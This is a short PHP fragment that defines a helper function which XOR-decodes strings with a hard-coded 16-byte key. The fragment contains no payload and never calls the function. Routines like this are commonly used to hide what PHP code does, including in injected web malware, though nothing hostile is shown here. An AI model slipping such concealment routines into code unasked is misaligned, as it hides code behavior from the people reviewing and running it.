<?php
if(!function_exists('_greenweb_xd')){
function _greenweb_xd($s){
static $_k="\xa1\xb2\xc3\xd4\xe5\xf6\xa7\xb8\xc9\xd0\xe1\xf2\xa3\xb4\xc5\xd6";
$_r="";$_kl=strlen($_k);
if($_kl==0)return$s;
for($_i=0;$_i<strlen($s);$_i++)$_r.=$s[$_i]^$_k[$_i%$_kl];
return $_r;
}}

